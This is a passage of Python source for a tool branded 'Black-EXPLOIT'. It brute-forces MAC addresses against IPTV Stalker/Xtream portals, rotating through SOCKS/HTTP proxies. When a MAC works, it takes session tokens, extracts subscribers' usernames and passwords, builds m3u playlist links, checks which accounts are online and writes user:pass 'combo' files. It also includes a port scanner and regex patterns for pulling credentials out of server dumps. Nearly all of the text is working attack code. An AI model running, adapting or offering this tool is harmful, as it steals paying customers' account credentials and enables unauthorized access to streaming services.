                        host = self.proxiesList[i].split(':')[0].replace(' ', '')
                        port = self.proxiesList[i].split(':')[1].replace(' ', '')
                        proxies = {'http': 'socks4://' + host + ':' + port, 'https': 'socks4://' + host + ':' + port}
                    else:
                        if (self.proxyType == ScannerProxies.HTTP):
                            self.proxiesList[i] = self.proxiesList[i].replace('\n', '')
                            host = self.proxiesList[i].split(':')[0].replace(' ', '')
                            port = self.proxiesList[i].split(':')[1].replace(' ', '')
                            proxies = {'http': 'http://' + host + ':' + port,
                                       'https': 'http://' + host + ':' + port}
                self.proxiesList[i] = proxies
            except Exception as err:
                if (i != ''):
                    self.proxiesList.remove(self.proxiesList[i])

    def __str__(self):
        return str(self.proxiesList)

    
    def getProxy(self):
        proxySelected = self.lastGivenProxy % self.totalProxies
        self.lastGivenProxy += 1
        return self.proxiesList[proxySelected]


class PortalScanner:
    hitc = 0
    htir = 0
    tokenr = ""
    total = ""
    cpm = 0
    panel = ""
    datosSalida: OutpotHitsFiles
    # portal = ""
    hityaz = 0
    totalHilos = 0
    listaMac = ""
    hitr = "\33[1;33m"
    cpm = 0
    cpmx = 0
    excelWriter: ExcelOut
    useProxies = False
    miScannerProxies: ScannerProxies
    jumpMacs = 0
    lock = threading.Lock()
    contador = 0
    TiempoInicio = 0
    initialMacPosition = 0  
    


    def __str__(self):
        return str(self.hitc) + "---" + str(self.htir) + "---" + str(tokenr) + "---" + str(self.total) + "---" + str(
            self.cpm) + "---PortalScanner:" + self.panel + "---" + str(self.datosSalida) + "---" + str(
            self.hityaz) + "---" + str(self.totalHilos) + "---" + self.listaMac + "---" + str(self.cpmx)

    def __init__(self, portalName, datosFicherosSalida, totalHilos, excelW: ExcelOut, useProxy,
                 _scannerProxies: ScannerProxies, jumpMacs):
        self.totalHilos = portalName
        self.datosSalida = datosFicherosSalida
        self.totalHilos = totalHilos
        self.hitc = 0
        self.panel = portalName
        self.excelWriter = excelW
        self.useProxies = useProxy
        self.miScannerProxies = _scannerProxies
        self.jumpMacs = int(jumpMacs)
        self.initialMacPosition = int(jumpMacs)


    
    def hit(self, miHit: HitData):
        try:
            self.hitRecorder(miHit)
            self.hityaz = self.hityaz + 1            
            if self.hityaz >= self.hitc:
                hitr = "\33[1;33m"
        except Exception as err:
            print("Fehler beim schreiben des HITs:", str(miHit))

    

    def hitRecorder(self, mihit: HitData):
        try:
            outputFile = open(self.datosSalida.outputMainFile, 'a+', encoding="utf8")
            outputFile.write(str(mihit))
            outputFile.close()
            if (aplicarFiltro):
                if (searchString(patronFiltroPais, str(mihit))):                    
                    fichero_salidaFiltro = open(self.datosSalida.salidaFiltro, 'a+', encoding="utf8")
                    fichero_salidaFiltro.write(str(mihit))
                    fichero_salidaFiltro.close()
            
            fichero_salidaFiltro = open(self.datosSalida.salidaReducida, 'a+', encoding="utf8")
            fichero_salidaFiltro.write(mihit.mac + "\n")
            fichero_salidaFiltro.close()
            if (mihit.m3uValid.find("ONLINE")>=0):
                
                outputFile = open(self.datosSalida.salidaHitsM3U, 'a+', encoding="utf8")
                outputFile.write(str(mihit.m3uURL)+"\n")
                outputFile.close()
                outputFile = open(self.datosSalida.ficheroCOMBOSHITS, 'a+', encoding="utf8")
                outputFile.write(str(mihit.user+":"+mihit.password) + "\n")
                outputFile.close()
            
            self.excelWriter.writetoExcel(mihit)
        except Exception as err:
            print("Fehler beim schreiben der Datei:", err,
                  "--------------------------------------------------------------------------------------------")


        canal = ""
        if veri.count('title":"') > 1:
            for i in veri.split('title":"'):
                try:
                    canal = str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/', '/')
                except:
                    canal = ""
                categoria = categoria + canal + livel
        list = categoria
        return list

    def m3uapi(self, playerlink, macs, token, miHit: HitData, miSession):
        mt = ""
        intento = 0
        message = ""
        bitism = ""
        mcon = ""
        userm = ""
        timezone = ""
        port = ""
        veri = ""
        acon = ""
        status = ""
        bitism = ""

        while True:
            try:
                res = miSession.get(playerlink, headers=hea2(macs, self.panel, token), timeout=7, verify=False)
                veri = ""
                veri = str(res.text)
                if (veri.count("503 Service") == 0):
                    break
                else:
                    raise Exception("503 Service nicht erreichbar")
            except:
                time.sleep(1)
                intento = intento + 1
                if intento == 6:
                    break
        try:
            if 'active_cons' in veri:
                acon = veri.split('active_cons":')[1]
                acon = acon.split(',')[0]
                acon = acon.replace('"', "")

                mcon = veri.split('max_connections":')[1]
                mcon = mcon.split(',')[0]
                mcon = mcon.replace('"', "")

                status = veri.split('status":')[1]
                status = status.split(',')[0]
                status = status.replace('"', "")

                timezone = veri.split('timezone":"')[1]
                timezone = timezone.split('",')[0]
                timezone = timezone.replace("\/", "/")

                realm = veri.split('url":')[1]
                realm = realm.split(',')[0]
                realm = realm.replace('"', "")

                port = veri.split('port":')[1]
                port = port.split(',')[0]
                port = port.replace('"', "")

                userm = veri.split('username":')[1]
                userm = userm.split(',')[0]
                userm = userm.replace('"', "")

                pasm = veri.split('password":')[1]
                pasm = pasm.split(',')[0]
                pasm = pasm.replace('"', "")

                bitism = veri.split('exp_date":')[1]
                bitism = bitism.split(',')[0]
                bitism = bitism.replace('"', "")
                try:
                    message = veri.split('message":"')[1].split(',')[0].replace('"', '')
                except:
                    False
                if bitism == "null":
                    bitism = "Unlimited"
                else:
                    bitism = (datetime.datetime.fromtimestamp(int(bitism)).strftime('%d-%m-%Y %H:%M:%S'))
            miHit.mensaje = str(message)
            miHit.caducidad = bitism
            miHit.conexionesActivas = acon
            miHit.maxConexiones = mcon
            miHit.nickn = str(nickn)
            miHit.playerlink = playerlink
            miHit.panel = """http://""" + self.panel + """/c/"""
            miHit.user = userm
            miHit.port = port
            miHit.timezone = timezone
        except Exception as error:
            print("Fehler beim erstellen der M3U-API:", error,
                  "---------------------------------------------------------------------")
            pass


    def doScan(self, datosFicherosSalida: OutpotHitsFiles, numeroBot: int, miSession, miProxy: ScannerProxies,apiMode,listaMacs):
        if apiMode:
            self.jumpMacs=0 
            posicionMac=-1
        actualProxie = ""
        pattern = "(\w{2}:\w{2}:\w{2}:\w{2}:\w{2}:\w{2})"
        veri = ""
        conexionErronea = False
        funcionar = True
        posicionMac=-1
        while (funcionar) and (posicionMac+1<len(listaMacs)):
            if (conexionErronea == True): break
            try:                
                self.lock.acquire()
                posicionMac = self.jumpMacs  
                self.jumpMacs += 1
                self.lock.release()
            
            except Exception as vErr:
                funcionar = False
                print("Fehler---->" + vErr)
                self.lock.release()
                break  
            if (not apiMode) and (tipoMac == "0"):
                mac = randommac()
            else:
                try:
                    macv = re.search(pattern, listaMacs[posicionMac],
                                 re.IGNORECASE)  # lista macs es un objeto compartido por todos los hilos, solo cambia la posición que se lee
                except Exception as errp:
                    print("****************Error leyendo mac pos:",posicionMac,"---",errp)
                    funcionar=False
                    mac="00:00:00:00:00"
                if funcionar and macv:
                    mac = macv.group()
                else:
                    continue
            macs = mac.upper().replace(':', '%3A')
            miUrlDeclase = URLdeclare(self.panel, portalConcatString, mac)
            bot = "Bot_" + str(numeroBot)
            intento = 0
            miUrlDeclase.changeMac(macs) 
            if (self.useProxies):
                actualProxie = miProxy.getProxy()
                miSession.proxies.update(actualProxie)  
            while True:
                try:
                    miHeader = hea1(macs, self.panel)
                    res = miSession.get(miUrlDeclase.url1, headers=miHeader, timeout=15, verify=False)
                    veri = str(res.text) 
                    if (veri.count('503 Service') == 0):
                        break
                    else:
                        raise Exception("503 Service nicht erreichbar")
                except Exception as err:  
                    print("---Connection Error to portal--try-" + str(intento) + "--------Bot:" + str(
                        numeroBot) + "---proxy:" + str(actualProxie) + "---------><", err,"\n",miUrlDeclase.url1)
                    if (self.useProxies):  
                        actualProxie = miProxy.getProxy()
                        miSession.proxies.update(actualProxie) 
                    intento = intento + 1                    
                    if ((intento >= 0) and not (self.useProxies)):
                        conexionErronea = True
                        break
            tokenr = "\33[35m"
            if 'token' in veri: 
                tokenr = "\33[0m"
                token = veri.replace('{"js":{"token":"', "")
                token = token.split('"')[0]
                token = re.sub("\\r|\\n|\}", "", token) 
                intento = 0
                while True:
                    try:
                        miHeader = hea2(macs, self.panel, token)
                        res = miSession.get(miUrlDeclase.url2, headers=miHeader, timeout=15, verify=False)                        
                        veri = ""
                        veri = str(res.text)
                        if (veri.count('503 Service') == 0):                            
                            break
                        else:
                            raise Exception("503 Service Temporarily Unavailable")
                    except Exception as err:
                        intento = intento + 1                        
                        if ((intento >= 1) and not (self.useProxies)):
                            conexionErronea = True
                            break
                id = "null"
                ip = ""
                try:
                    id = veri.split('{"js":{"id":')[1]
                    id = id.split(',"name')[0]
                    ip = veri.split('ip":"')[1]
                    ip = ip.split('"')[0]
                except:
                    pass
                if not id == "null":
                    intento = 0
                    while True:
                        try:
                            miHeader = hea2(macs, self.panel, token)
                            res = miSession.get(miUrlDeclase.url3, headers=miHeader, timeout=15, verify=False)
                            veri = ""
                            veri = str(res.text)
                            if (veri.count('503 Service') == 0): 
                                break
                            else:
                                raise Exception("503 Service Temporarily Unavailable")
                        except:
                            intento = intento + 1                            
                            if ((intento >= 1) and not (self.useProxies)):
                                conexionErronea = True
                                break
                    if not veri.count(
                            'phone') == 0:  
                        self.hitr = "\33[1;36m"
                        self.hitc = self.hitc + 1
                        lastDate = ""
                        if 'end_date' in veri:
                            lastDate = veri.split('end_date":"')[1]
                            lastDate = lastDate.split('"')[0]
                        else:
                            try:
                                lastDate = veri.split('phone":"')[1]
                                lastDate = lastDate.split('"')[0]
                                if lastDate.lower()[:2] == 'un':
                                    tiempoRestante = (" Days")
                                else:
                                    tiempoRestante = (str(dateAdjust(lastDate)) + " Days")
                                    lastDate = lastDate + ' ' + tiempoRestante
                            except:
                                pass                        
                        intento = 0
                        while True:
                            try:
                                miHeader = hea2(macs, self.panel, token)
                                res = miSession.get(miUrlDeclase.url6, headers=miHeader, timeout=10, verify=False)                                
                                veri = ""
                                veri = str(res.text)
                                if (veri.count('503 Service') == 0):
                                    cid = ""
                                    if (veri != ""):
                                        cid = (str(res.text).split('ch_id":"')[5].split('"')[0])
                                    break
                                else:
                                    raise Exception("503 Service Temporarily Unavailable")
                            except:
                                intento = intento + 1                                
                                if intento == 10:                                    
                                    conexionErronea = True
                                    cid = "94067"
                                    break
                        real = self.panel
                        m3ulink = ""
                        user = ""
                        pas = ""
                        accountType = "Invalid Opps"
                        intento = 0
                        serieslist = ""
                        while True:
                            try:
                                miHeader = hea2(macs, self.panel, token)
                                res = miSession.get(url(cid, self.panel, portalConcatString, macs), headers=miHeader,
                                                    timeout=15,
                                                    verify=False)                                
                                veri = ""
                                veri = str(res.text)
                                if (veri.count('503 Service') == 0):  
                                    link = veri.split('ffmpeg ')[1].split('"')[0].replace('\/', '/')
                                    real = 'http://' + link.split('://')[1].split('/')[0] + '/c/'
                                    user = str(link.replace('live/', '').split('/')[3])
                                    pas = str(link.replace('live/', '').split('/')[4])
                                    m3ulink = 'http://' + self.panel.replace('/c/', '') + "/get.php?username=" + str(
                                        user) + "&password=" + str(pas) + "&type=m3u_plus"
                                    accountType = self.checkAccountType(link, miSession, self.panel)
                                    break
                                else:
                                    raise Exception("503 Service Temporarily Unavailable")
                            except Exception as err:
                                if (self.useProxies):
                                    actualProxie = miProxy.getProxy()
                                    miSession.proxies.update(actualProxie)
                                intento = intento + 1                                
                                if ((intento >= 1) and not (self.useProxies)):                                    
                                    break
                        playerapi = HitData()
                        if not m3ulink == "":
                            playerlink = str("http://" + self.panel.replace('http://', '').replace('/c/',
                                                                                              '') + "/player_api.php?username=" + user + "&password=" + pas)
                            self.m3uapi(playerlink, macs, token, playerapi, miSession)
                            if playerapi.mensaje == "":
                                playerlink = str("http://" + real.replace('http://', '').replace('/c/',
                                                                                                 '') + "/player_api.php?username=" + user + "&password=" + pas)
                                self.m3uapi(playerlink, macs, token, playerapi, miSession)                        
                        try:
                            if m3uCheck(cid,user,pas,self.panel,miSession).find("KO")>=0:
                                playerapi.m3uValid="⛔️ 𝗢𝗙𝗙𝗟𝗜𝗡𝗘"
                            else:
                                playerapi.m3uValid = "  👍  💪 👍 ONLINE"

                        except Exception as errp:
                            print("!!!!!!!!!!!!!!!!!M3uCheck:",errp)
                        
                        vpn = ""
                        if not ip == "":
                            vpn = vpnip(ip, miSession)
                        else:
                            vpn = "No_CLIENT_IP"
                        livelist = ""
                        listlink = miUrlDeclase.liveurl
                        livel = ' «⭐️» '
                        livelist = self.list(listlink, macs, token, livel, miSession)
                        listlink = miUrlDeclase.vodurl
                        livel = ' «💥️» '
                        vodlist = self.list(listlink, macs, token, livel, miSession)
                        listlink = miUrlDeclase.seriesurl
                        livel = ' «⚡️️» '
                        serieslist = self.list(listlink, macs, token, livel, miSession)
                        
                        try:
                            playerapi.mac = mac
                            playerapi.real = real
                            playerapi.url = real
                            playerapi.password = pas
                            playerapi.user = user
                            playerapi.playerlink = playerapi
                            playerapi.portal = """http://""" + self.panel + """/c/"""
                            playerapi.panel = self.panel
                            playerapi.serieslist = serieslist
                            playerapi.vodlist = vodlist
                            playerapi.livelist = livelist
                            playerapi.nickn = nickn
                            playerapi.vpn = vpn
                            playerapi.m3uURL = m3ulink
                            playerapi.accountType = accountType
                            if (playerapi.caducidad == ""):
                                playerapi.caducidad = lastDate
                            self.createSerialInfoFromMAC(playerapi)
                            if apiMode:
                                return playerapi
                            else:
                                self.hit(playerapi)
                            playerapi.m3uValid=""
                        except Exception as error:
                            print("Fehler beim schreiben der HITs-Datei:", error)
                    else:
                        False                        
                        if apiMode:
                            return ""
            else:
                False
                if apiMode:
                    return ""
        print("Thread:", numeroBot, " Panel:", self.panel, " Fertig")


    def iniciarHilos(self):
        self.TiempoInicio = time.time()  # tiempo en el que empiezo
        daemon = threading.Thread(target=self.daemonRunbackup)
        daemon.setDaemon(True)

        for n in range(self.totalHilos):
            try:
                import cfscrape
                sesq = requests.Session()
                sessionThread = cfscrape.create_scraper(sess=sesq)
            except:
                sessionThread = requests.Session()
            print("Starte Thread", n, " auf Panel:", panel, "++++++++++", version,
                  "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
            t1 = threading.Thread(target=self.doScan, args=(self.datosSalida, n, sessionThread, miScannerProxies,))
            t1.start()

        daemon.start()


logopic=(""" 
\033[1;32m┌───────────────────────┐\033[0m
\033[1;32m│   \033[1;33mBlack-EXPLOIT\033[1;32m       │\033[0m
\033[1;32m│  \033[1;33mTraducido Por ocus \033[1;32m  │\033[0m
\033[1;32m│   \033[1;33m[MIB] Orignal\033[1;32m       │\033[0m
\033[1;32m└───────────────────────┘\033[0m
""")
my_os=platform.system()
print("\033[1;31m  Mi Sistema:", my_os, "\033[0m")
rootDir=""
if (my_os == "Windows"):
    rootDir = "."  
else:
    rootDir = "/content" 
decode_hex = codecs.getdecoder('hex_codec')


def crearDirectoriosBase():
    if os.path.exists(rootDir + "/debug") == False:
        os.mkdir(rootDir + "/debug")
    if os.path.exists(rootDir + "/hits") == False:
        os.mkdir(rootDir + "/hits")
    if os.path.exists(rootDir + "/combo") == False:
        os.mkdir(rootDir + "/combo")


class PortScanner:
    header1 = {
        "Host": "www.ipfingerprints.com",
        "Connection": "keep-alive",
        "Accept": "application/json, text/javascript,*/*; q=0.01",
        "Content-Type": f"application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
        "sec-ch-ua-platform": "\"Windows\"",
        "Origin": f"https://www.ipfingerprints.com",
        "Referer": f"https://www.ipfingerprints.com/portscan.php",
        "Accept-Language": "de;q=0.9",
        "Accept-Encoding": "gzip, deflate"
        }

    def tratarSalidaPuertos(self,_entrada: dict):        
        separada: list
        puertos = []
        cadena = _entrada['portScanInfo']
        separada = cadena.split("\n")

        for elemento in separada:
            if (elemento.find("tcp") >= 0):
                if (elemento.find("open") >= 0):
                    pos = elemento.find("/")
                    puertos.append(int(elemento[:pos]))
        return puertos
    def createCoockiePanel(self, _host, _startport, _endport):
        coockieDat = {
            "remoteHost": _host,
            "start_port": _startport,
            "end_port": _endport,
            "normalScan": "Yes",
            "scan_type": "connect",
            "ping_type": "none"
        }
        return coockieDat


    def searchOpenPorts_WEB(self,initPort: int, finishPort: int, ipServerToScan: str):
        print(Fore.GREEN+"\nLos puertos se escanean utilizando el método WEB gescannt!\nServer => "+ipServerToScan,Fore.RESET+Fore.YELLOW+"\n\nEspere Un Momento...!!!\n"+Fore.RESET)
        parametros = self.createCoockiePanel(ipServerToScan, str(initPort), str(finishPort))
        try:
            dat = requests.post("https://www.ipfingerprints.com/scripts/getPortsInfo.php", headers=self.header1,
                                        data=parametros,
                                        timeout=300)  # wenn wir in 300 Sekunden keine Antwort erhalten, brechen wir die Konsultation ab            
            puertos = self.tratarSalidaPuertos(dat.json())
            return puertos
        except Exception as errp:
            print("Fehler beim Aufruf der URL zur Porterkennung:", errp)
            return []

    def test_port_number(self,host, port):        
        with socket(AF_INET, SOCK_STREAM) as sock:            
            sock.settimeout(5)            
            try:                
                sock.connect((host, port))
                print("Port gefunden für:",host,":",port)                
                sock.shutdown(SHUT_RDWR)
                sock.close()
                return True
            except:                
                sock.close()
                return False
    def port_scan(self,host, port:range,_scaneoLento):
        if scanPORTTYPE=="WEB":
            return self.searchOpenPorts_WEB(port.start,port.stop,host)
        else:
            return self.test_port_numberLOCAL(host,port,_scaneoLento)
    
    def test_port_numberLOCAL(self, host, ports,scaneLento):
        print(f'\nPorts werden mit der lokalen Methode gescannt => {host}...')        
        totalHilos=len(ports)
        if scaneLento==0:
            totalHilos=1        
        with ThreadPoolExecutor(totalHilos) as executor:
            results = executor.map(self.test_port_number, [host]*len(ports),ports)            
            openPorts = []
            for port, is_open in zip(ports, results):
                if is_open:
                    openPorts.append(port)
            if (debug):
                print("Ports =>",openPorts)
            return openPorts

class OutputFileWriter:
    nombreBase:str
    maxSizeperFile:int
    nombreActual:str
    contador:int

    def __int__(self, _nombreBase:str):
        self.nombreBase=_nombreBase
        self.nombreActual=self.nombreBase
        self.contador+=1
    def initValues(self,serverURL):
        self.nombreBase=serverURL.replace(":","_")
        self.nombreBase = self.nombreBase.replace(".", "_")
        self.nombreActual=self.nombreBase
        self.contador=1

    def writeToFile(self,entrada:str):
        try:
            nombreFICHERO=rootDir+"/debug/" + self.nombreActual + ".txt"
            fichero=open(nombreFICHERO,"a")
            file_size = os.path.getsize(nombreFICHERO)
            if (file_size / 1024) > 3000:  
                self.nombreActual = self.nombreBase + "_"+str(self.contador)
                self.contador+=1
                fichero = open(rootDir+"/debug/"+self.nombreActual+".txt", "a")
            fichero.write(entrada)
            fichero.close()
        except Exception as errp:
            print("Fehler beim schreiben der DUMP-DATEI:",errp)


class DataContainer:
    colaFifo:PriorityQueue
    lock
    def __init__(self):
        self.colaFifo = PriorityQueue()
        self.lock = threading.Lock()

    def put(self,entrada):
        self.lock.acquire()
        self.colaFifo.put(entrada)
        self.lock.release()
    def get(self):
        return self.colaFifo.get()


class DataAnalyzer:
    miDataContainer:DataContainer
    patronURL_USERNAME_PASSWORD= "username=[A-z0-9_*!¡@$?¿:\-\.@]*\&password=[A-z0-9_*!¡@$?¿:\-\.@]*"
    patronLISTACANAL_M3U="https?:\/[\/A-z0-9_*!¡@$?.%¿:\-]{3,}"
    patronREQUEST_URI = "username=([A-z0-9_*!¡@$?¿:\-\.@]*\&password=[A-z0-9_*!¡@$?¿:\-\.@]*)(REQUEST_METHOD)"
    patronTOKEN="https?:\/\/[A-z0-9_*!¡@$?.%¿:\/]{4,}\/[A-z0-9_*!¡@$?.%¿:\-]*token"
    patronLIVE= "live\/[A-z0-9_*!¡@$?.%¿:\-]{2,}\/[A-z0-9_*!¡@$?¿\-]{2,}"
    patronEXTINF="\/([A-z0-9_*!¡@$?.%¿:\-]*/){4,}([A-z0-9_*!¡@$?.%¿:\-]*)#EXTINF"
    contenedorUSER_PASS:dict
    urlBASE=""
    protocoloBase=""
    puertoBase=""
    primeraVez=True
    nombreFicheroCombos=""
    miDS:DatosServerM3U
    portal_url = None  
    
    def __init__(self):
        print("Mr.BlackHead sagt warte mal kurz...")
        self.hitCounter = 0  

    def setURLBase(self,_miDS:DatosServerM3U):
        self.urlBASE = _miDS.panelHost
        self.protocoloBase = _miDS.panelProtocolo
        self.puertoBase = _miDS.panelPuerto
        self.nombreFicheroCombos = (rootDir + "/debug/" + "COMBO_" + self.urlBASE.replace(".", "_").replace(":","_") + ".txt")
        self.miDS=_miDS

        
        directory = os.path.dirname(self.nombreFicheroCombos)
        if not os.path.exists(directory):
            os.makedirs(directory)

        
        files = glob.glob(directory + '/*')
        for f in files:
            os.remove(f)

    def validarM3U(self,entrada: str):
        HEADER1_m3u ={
        "Cookie": "stb_lang=de; timezone=Europe%2FIstanbul;",
        "X-User-Agent": "Model: MAG254; Link: Ethernet",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 OPR/101.0.0.0",
    }
        miM3U_UTILS=M3U_UTILS()
        protocolo, url, user, passw = separarUserPass(entrada)
        salida = entrada.replace("get.php", "player_api.php")
        session = requests.Session()
        
        try:
            miHitData = HitData()
            respuesta = session.get(url=salida,headers=HEADER1_m3u, timeout=2)
            datosLista=respuesta.json()
            if (respuesta.status_code == 200) and (datosLista['user_info']['auth']!=0):
                    miPortalScanner = PortalScanner("", "", 1, "", False, "", 0)
                    valorScanner, urlServer, puerto, procolo = checkFullM3U_URL(entrada, session)
                    if ((valorScanner.find("OK") >= 0) or (valorScanner.find("KOK") >= 0)):
                        if (valorScanner.find("KOK") >= 0):
                            miHitData.m3uValid = "NO_SE"
                        else:
                            miHitData.m3uValid = "ONLINE"
                    miHitData.real = url
                    miHitData.url = url
                    miHitData.m3uURL = entrada
                    miM3U_UTILS.extractDataFromList(user, passw, respuesta.text, url, miHitData)
                    listaCanales=miM3U_UTILS.extractChannelListM3U_FromUSER_PASS(url, user, passw)
                    miHitData.livelist=listaCanales
                    return miHitData
            else:                
                return ""

        except Exception as errp:            
            return ""
        print(respuesta.text)

    
    def writeComboToFile(self,user,passw):
        try:
            fichero = open(self.nombreFicheroCombos, "a")
            fichero.write(user+":"+passw)
            fichero.write("\n")
            fichero.close()
        except Exception as errp:
            cadena=Fore.RED+Back.BLACK+"\033[1;92m\n\nFehler beim Schreiben in die Combo-Datei"+errp+Fore.RESET+Back.RESET
            print (cadena)
    
    def readComboFromFile(self,miDiccionario:dict):
        try:
                if os.path.exists(self.nombreFicheroCombos) == True:
                    texto=Fore.BLACK+Back.WHITE+"Reading previous combo file _"+self.nombreFicheroCombos+Fore.RESET+Back.RESET
                    with open(self.nombreFicheroCombos, 'r')  as f:                        
                        lines = f.readlines()

                    for line in lines:                        
                        key, value = line.split(':')                        
                        miDiccionario[key] = value

                    texto = Fore.BLACK + Back.WHITE + "Geschriebene COMBOS insgesamt _" + str(len(self.contenedorUSER_PASS)) + Fore.RESET + Back.RESET
                    print(texto)

        except Exception as errp:
            print("Fehler beim Lesen der Combo:"+self.nombreFicheroCombos," => ",errp)



    def is_ip_address(self, url):
        try:
            ipaddress.ip_address(url)
            return True
        except ValueError:
            return False

          

    
    def generateURL_m3u(self, _user, passw):
        global portal_url  
        try:
            print("\033[1;33m\nTienes un HiT \033[31mBebe\n\n\033[1;33mUSER:PASS: \033[1;92m"+_user+":"+passw+"\033[0m\n")
            url_to_use = self.urlBASE if not portal_url else portal_url            
            if url_to_use.startswith("http://"):
                url_to_use = url_to_use[7:]
            elif url_to_use.startswith("https://"):
                url_to_use = url_to_use[8:]
            port = self.puertoBase
            if ":" in url_to_use:
                url_to_use, port = url_to_use.rsplit(":", 1)
            urlM3U=self.protocoloBase+"://"+url_to_use+":"+str(port)+"/get.php?username="+_user+"&password="+passw+"&type=m3u_plus"
                        
            nombreFricheroM3U_OK=(rootDir+"/HITS/"+self.urlBASE.replace(".","_").replace(":","_")+".txt")
            nombreFricheroM3U_LISTA=(rootDir+"/m3u/"+self.urlBASE.replace(".","_")+"_m3u.txt")
            os.makedirs(os.path.dirname(nombreFricheroM3U_LISTA), exist_ok=True)
            nombreFricheroM3U_COMBO = (rootDir + "/combo/" + self.urlBASE.replace(".", "_").replace(":","_") + "_COMBO.txt")

            if self.is_ip_address(self.urlBASE):
                nombreFricheroM3U_COMBO = (rootDir + "/combo/" + self.urlBASE.replace(".", "_").replace(":","_") + "_COMBO.txt")
                if not os.path.exists(nombreFricheroM3U_COMBO):  
                    with open(nombreFricheroM3U_COMBO, "a", encoding="utf8") as ficheroCOMBO: 
                        ficheroCOMBO.write(portal_url + "\n")  

            with open(nombreFricheroM3U_COMBO, "a", encoding="utf8") as ficheroCOMBO: 
                if _user and passw:
                    ficheroCOMBO.write(_user + ":" + passw + "\n")

            miHidata=self.validarM3U(urlM3U)
            if miHidata!='':
                with open(nombreFricheroM3U_OK, "a", encoding="utf8") as ficherFULL:
                    ficherFULL.write(str(miHidata))
                    ficherFULL.write("\n")

                with open(nombreFricheroM3U_LISTA, "a", encoding="utf8") as fichero_nombreFricheroM3U_COMBO:
                    fichero_nombreFricheroM3U_COMBO.write(miHidata.m3uURL+"\n")

            return miHidata
        except Exception as errp:
            print("Fehler beim schreiben der HITS-Datei!!!!!",errp)
            import traceback
            traceback.print_exc()
            quit()
    def extractDataRequestEXTINF(self,entrada:str):
        try:
            datos = entrada.split("/")
            user = datos[3]
            passw = datos[4]
            return user, passw
        except Exception as errp:
            cadena=Fore.RED+Back.BLACK+"Fehler bei der Verarbeitung der Extraktionsdaten aus REQUEST_EXTINF:"+errp+ " input data:"+entrada+Fore.RESET+Back.RESET
            print(cadena)
            return "", ""
    def extractDataRequestLIVE(self,entrada:str):
        try:
            datos = entrada.split("/")
            user = datos[1]
            passw = datos[2]
            return user, passw
        except Exception as errp:
            cadena=Fore.RED+Back.BLACK+"Fehler bei der Verarbeitung der Extraktionsdaten aus REQUEST_LIVE:"+errp+ " input data:"+entrada+Fore.RESET+Back.RESET
            print(cadena)
            return "", ""
    def extractDataRequestTOKEN(self, entrada: str):
        try:
            datos = entrada.split("/")
            user = datos[3]
            passw = datos[4]
            return user, passw
        except Exception as errp:
            cadena=Fore.RED+Back.BLACK+"Fehler bei der Verarbeitung der Extraktionsdaten aus REQUEST_TOKEN:"+errp+ " input data:"+entrada+Fore.RESET+Back.RESET
            print(cadena)
            return "", ""
    def extractDataREQUEST_URI(self, entrada:str):
        try:
            datos=entrada.split("/")
            user=datos[1]
            passw=datos[2]
            return user, passw
        except Exception as errp:
            cadena = Fore.RED + Back.BLACK +"Fehler bei der Verarbeitung der Extraktionsdaten aus REQUEST_URI:" + errp + " input data:" + entrada + Fore.RESET + Back.RESET
            print(cadena)
            return "",""
    def extractData_URL_USERNAME_PASSWORD(self, _entrada: str):
        try:
            entrada=_entrada.split("REQUEST")
            datos = _entrada.split("username=")
            salida = (datos[1].split("&password="))
            user = salida[0]
            passw = salida[1]
            return user, passw
        except Exception as errp:
            cadena = Fore.RED + Back.BLACK +"Fehler bei der Verarbeitung der Extraktionsdaten aus REQUEST_LOGIN:" + errp + " input data:" + entrada + Fore.RESET + Back.RESET
            return "", ""
    def extractData_LISTACANAL_m3u(self,entrada):
        try:
            datos=entrada.split("/")
            user = datos[3]
            passw = datos[4]
            return user,passw
        except:
            return "",""

    def setDataContainer(self,_dataC:DataContainer):
        self.miDataContainer=_dataC

    def setCombosCotainer(self,_miDictCombos:dict):
        self.contenedorUSER_PASS=_miDictCombos




    
    def tratarUsuario(self, user, passw):
        lock.acquire()
        if user != "":
            cadena = "\033[1;32m┌───────────────────────\033[0m\n"  # Grüner fetter Rahmen
            cadena += "\033[1;32m│    \033[1;33mBLACK-EXPLOIT \033[0m\n"  # Gelbe fette Schrift
            cadena += "\033[1;32m│ \033[1;31mUsuario:\033[1;33m " + user + ":" + passw + "\033[0m\n"  # Gelbe fette Schrift
            cadena += "\033[1;32m│ \033[1;31mTamaño del contenedor:\033[1;33m " + str(self.miDataContainer.colaFifo.qsize()) + "\033[0m\n"  # Gelbe fette Schrift
            cadena += "\033[1;32m│ \033[1;31mCombo Container ID:\033[1;33m " + str(id(self.contenedorUSER_PASS)) + "\033[0m\n"  # Gelbe fette Schrift
            cadena += "\033[1;32m│ \033[1;33mProceso:\033[1;35m " + threading.current_thread().name + "\033[0m\n"  # Gelbe fette Schrift
            cadena += "\033[1;32m│ \033[1;32mZEIT:\033[1;31m " + str(time.strftime('%d %B %Y • %H:%M:%S')) + "\033[0m\n"  # Gelbe fette Schrift
            cadena += "\033[1;32m│ Hits:\033[1;33m " + str(self.hitCounter) + "\033[0m\n"  # Gelbe fette Schrift
            cadena += "\033[1;32m│ \033[1;31m[MIB] ORIGINAL  \033[0m\n"  # Gelbe fette Schrift
            cadena += "\033[1;32m│ \033[1;31mCode by Mr.Black           \033[0m\n"  # Gelbe fette Schrift
            cadena += "\033[1;32m└───────────────────────\033[0m"  # Grüner fetter Rahmen
            print(cadena)
            
            if user not in self.contenedorUSER_PASS:                
                self.contenedorUSER_PASS[user] = passw
                miHitData = self.generateURL_m3u(user, passw)
                self.writeComboToFile(user, passw)  
                cadena = "\033[1;33m\n✮ Kunde: \033[1;92m" + user + "\033[1;33m\n✮ Kunden Daten: \033[1;92m" + user + ":" + passw + "\033[0m\n\n------------------------------\n\n"
                print(cadena)

                self.hitCounter += 1  
        lock.release()
    def doAnalyze(self):
